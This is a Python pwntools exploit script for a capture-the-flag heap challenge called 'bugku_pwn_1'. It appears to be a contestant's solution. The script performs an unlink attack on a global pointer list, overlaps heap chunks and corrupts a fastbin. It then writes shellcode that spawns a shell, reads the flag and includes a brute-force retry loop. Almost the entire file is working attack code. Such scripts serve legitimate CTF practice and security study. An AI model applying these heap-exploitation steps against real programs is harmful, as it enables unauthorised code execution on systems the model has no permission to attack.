# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './bugku_pwn_1'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size , data = 'a'):
    cmd(1)
    sla('Size:' , size)
    sa('Data:' , data)

def delete(idx):
    cmd(2)
    sla('Index:' , idx)

def edit(idx , size , data):
    cmd(3)
    sla('Index:' , idx)
    sla('Size:' , size)
    sa('Data:' , data)

# one_gad = one_gadget(libc.path)

def attack():
    
    prt_list = 0x601040
    
    add(0x38)
    add(0x88)
    add(0x18)
    
    edit( 0 , 0x40 , flat(0, 0x30 , prt_list - 0x18 ,prt_list - 0x10 , 0,0,0x30 ,0x90) )
    delete(1)

    add(0xb8) #3
    add(0x68) #4
    add(0x68) #5

    add(0x18) #6

    edit(2 , 0x500 , flat('\x00'*0x18 , 0x70+0x71))
    delete(4)
    delete(5)
    add(0x38) #7
    add(0x28) #8

    edit(5 , 1 , '\x05')
    add(0x68)
    fake_list = flat(
       0,0,
       0,prt_list ,
       0,0
    )
    edit(0 , 0x30 , fake_list)

    add(0x68)
    edit(0 , 9 , p64(prt_list) + '\x10')
    edit(1 , 8 , p64(prt_list))
    edit(0 , 0x40 , asm(shellcraft.sh()).ljust(0x40,'\x00'))
    # dbg()
    

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   bugku_pwn_1.py
@Time    :   2021/11/13 19:28:18
@Author  :   Niyah 
'''